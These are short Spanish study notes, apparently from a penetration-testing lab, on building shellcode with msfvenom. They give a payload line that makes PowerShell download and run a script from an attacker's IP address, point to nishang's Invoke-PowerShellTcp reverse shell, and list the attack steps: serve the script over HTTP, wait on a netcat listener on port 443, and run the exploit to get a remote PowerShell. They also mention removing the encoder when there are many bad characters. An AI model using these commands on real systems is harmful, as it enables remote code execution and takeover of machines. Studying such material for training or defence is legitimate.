> El **shellcode** es un conjunto pequeño de instrucciones en lenguaje ensamblador convertido a código máquina, utilizado como carga útil (_payload_) en un ataque cibernético. Se inyecta en un programa vulnerable para tomar el control del sistema operativo y ejecutar comandos arbitrarios.

- Para ejecutar un comando dado
```bash
# al comando normal de msfvenom
-p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.111.45/PS.ps1')"
```
- Descargamos este archivo de
- [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) = repo de github, shell, invoke powershell
- wget de ello
- es un script en powershell que carga una funcion para obtener una powershell

### Atacamos
- Consola 1: `python -m http.server 80` (donde tenemos el codigo descargado)
- Consola 2: `rlwrap nc -nlcp 443` (obtendremos acceso)
- Consola 3: ejecutamos el python, ahora vamos a ganar un shell de windows pero una powershell

### Si hay muchos badchars
- Sacar el encoder -e cuando creamos el shellcode